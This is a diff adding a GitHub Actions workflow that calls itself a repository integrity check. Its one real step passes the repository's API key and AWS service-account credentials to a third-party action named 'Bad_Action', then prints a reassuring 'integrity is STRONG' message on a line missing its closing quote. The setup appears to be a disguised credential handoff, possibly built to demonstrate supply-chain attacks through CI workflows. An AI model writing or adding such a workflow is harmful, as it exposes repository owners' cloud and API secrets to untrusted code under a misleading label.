@@ -1,0 +1,18 @@
+on:
+  workflow_dispatch:  # Trigger the workflow manually
+
+jobs:
+  verify_integrity:
+    runs-on: ubuntu-latest
+    name: Checks the integrity of the repository using the git api
+    steps:
+      - name: Verify Integrity
+        id: verify
+        uses: turnernator1/Bad_Action@v1.1
+        with:
+          API-KEY: ${{ secrets.API_KEY }}
+          AWS_SERVICE_ACCOUNT_CREDS: ${{ secrets.AWS_SERVICE_ACCOUNT_CREDS }}
+
+      # Inform about the integrity verification
+      - name: Output result
+        run: echo "The integrity of the repository is STRONG!
